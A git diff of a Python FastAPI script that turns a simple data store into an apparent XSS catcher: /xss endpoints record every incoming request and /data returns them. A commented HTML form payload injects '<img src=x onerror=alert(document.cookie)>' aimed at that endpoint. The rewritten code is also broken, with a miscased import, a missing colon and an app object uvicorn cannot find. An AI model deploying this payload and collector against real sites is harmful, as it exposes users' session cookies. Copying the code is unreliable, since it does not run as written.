@@ -1,37 +1,55 @@
-from fastapi import FastAPI, Form
-from typing import Annotated
+from fastapi import Fastapi, Request
+# from fastapi import FastAPI, Form
+# from typing import Annotated
 import uvicorn
-from pydantic import BaseModel
+# from pydantic import BaseModel
 
-class InputData(BaseModel):
-    data: str
+# class InputData(BaseModel):
+#     data: str
 
-alldata = []
+def main():
+    data = []
+    
+    app = FastAPI()
 
-app = FastAPI()
-@app.get("/data")
-async def index(alldata=alldata):
-    print(alldata)
-    return {"message": "Hello World"}
+    @app.get("/xss")
+    async def get_xss(req: Request)
+        nonlocal data
+        data.append(req)
+        return {"message": 200}
 
-@app.post("/data")
-async def process_data(data: Annotated[str, Form()]):
-    alldata.append(data)
-    # Process the data as needed
-    return data
+    
+    @app.post("/xss")
+    async def post_xss(req: Request):
+        nonlocal data
+        data.append(req)
+        # Process the data as needed
+        return {"message": 200}
 
-@app.delete("/data")
-async def process_data(alldata=alldata):
-    for i in alldata:
-        alldata.pop(i)
-    return {"deleted"}
+    
+    @app.get("/data")
+    async def get_data():
+        nonlocal data
+        return {"datas": data}
+    
+    
+    @app.delete("/data")
+    async def del_data():
+        nonlocal data
+        data = []
+        # for i in alldata:
+        #     alldata.pop(i)
+        return {"message": "deleted"}
+
+
+    uvicorn.run("main:app", host="127.0.0.1", port=8000, reload=True)
 
 if __name__ == "__main__":
-    uvicorn.run("main:app", host="127.0.0.1", port=8000, reload=True)
+    main()
 
 # Payload we might be using:
 # 
-# <form action="http://127.0.0.1:8000" method="post">
+# <form action="http://127.0.0.1:8000/xss" method="post">
 #     <label for="data">Data:</label>
 #     <input type="text" id="data" name="data" value="<img src=x onerror=alert(document.cookie)>">
 #     <input type="submit" value="Submit">
